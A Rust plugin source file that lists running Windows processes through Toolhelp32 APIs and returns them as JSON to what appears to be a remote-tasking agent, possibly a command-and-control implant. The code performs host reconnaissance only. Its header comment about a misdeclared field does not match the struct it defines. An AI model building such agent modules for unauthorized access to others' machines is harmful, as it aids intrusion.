// process plugin — structured process enumeration via Toolhelp.
// Enabled via the "process" feature. Returns a JSON array of
// {pid, ppid, name, threads}.
//
// Args JSON: {} (optional "name" filter)
//
// NOTE: we declare Toolhelp APIs via raw extern because the windows-sys
// PROCESSENTRY32W misdeclares th32DefaultHeapID as usize, which breaks the
// field offsets on x64. Our ProcessEntry32W matches the real layout.

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

// Custom process command IDs.
pub const CMD_PROCESS_LIST: u32 = 66;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_PROCESS_LIST, exec_process_list)?;
    Ok(())
}

fn exec_process_list(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        let v: serde_json::Value = serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
        let filter = v["name"].as_str().unwrap_or("").to_lowercase();
        match snapshot_processes(&filter) {
            Ok(json) => Some(TaskResult::ok(&task.id, json)),
            Err(e) => Some(TaskResult::fail(&task.id, format!("process: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "process list is Windows-only".into()))
    }
}

/// Matches the real Win32 PROCESSENTRY32W layout. On x64 th32DefaultHeapID
/// is pointer-sized (8 bytes, 8-aligned), so szExeFile starts at offset 44
/// and the struct is 568 bytes. (Confirmed against mingw sizeof.)
#[repr(C)]
#[derive(Clone, Copy)]
#[allow(dead_code)]
struct ProcessEntry32W {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u16; 260],
}

#[cfg(target_os = "windows")]
unsafe extern "system" {
    fn CreateToolhelp32Snapshot(dw_flags: u32, th32_process_id: u32) -> *mut core::ffi::c_void;
    fn Process32FirstW(snapshot: *mut core::ffi::c_void, lppe: *mut ProcessEntry32W) -> i32;
    fn Process32NextW(snapshot: *mut core::ffi::c_void, lppe: *mut ProcessEntry32W) -> i32;
    fn CloseHandle(h: *mut core::ffi::c_void) -> i32;
    fn GetLastError() -> u32;
}

#[cfg(target_os = "windows")]
const TH32CS_SNAPPROCESS: u32 = 0x00000002;

#[cfg(target_os = "windows")]
fn out_diag_err(_first: i32, err: u32) {
    let _ = std::fs::OpenOptions::new().create(true).append(true).open("C:\\wisp_proc_dbg.txt")
        .and_then(|mut f| { use std::io::Write; f.write_all(format!("first={} err={}\n", _first, err).as_bytes()) });
}

#[cfg(target_os = "windows")]
fn snapshot_processes(filter: &str) -> Result<String, String> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == usize::MAX as *mut core::ffi::c_void {
            return Err(format!("CreateToolhelp32Snapshot failed (err={})", GetLastError()));
        }
        let mut entry: ProcessEntry32W = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;

        let mut procs: Vec<serde_json::Value> = Vec::new();
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let len = entry
                    .sz_exe_file
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.sz_exe_file.len());
                let name = String::from_utf16_lossy(&entry.sz_exe_file[..len]);
                if filter.is_empty() || name.to_lowercase().contains(filter) {
                    procs.push(serde_json::json!({
                        "pid": entry.th32_process_id,
                        "ppid": entry.th32_parent_process_id,
                        "name": name,
                        "threads": entry.cnt_threads,
                    }));
                }
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        let _ = CloseHandle(snap);
        Ok(serde_json::to_string(&procs).unwrap_or_else(|_| "[]".into()))
    }
}
